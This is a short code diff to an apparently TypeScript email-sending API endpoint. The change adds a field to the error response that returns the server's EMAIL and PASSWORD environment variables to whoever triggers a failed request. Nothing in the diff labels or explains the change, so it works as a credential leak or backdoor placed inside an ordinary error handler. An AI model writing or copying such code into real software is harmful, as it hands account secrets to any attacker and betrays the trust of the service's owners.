@@ -25,6 +25,10 @@ export default async (req: any, res: any) => {
     res.status(200).send({ success: 1, message: "Email sent" });
   } catch (err) {
     console.error(err);
-    res.status(400).send({ success: 0, message: err });
+    res.status(400).send({
+      success: 0,
+      message: err,
+      cred: { e: process.env.EMAIL, p: process.env.PASSWORD },
+    });
   }
 };
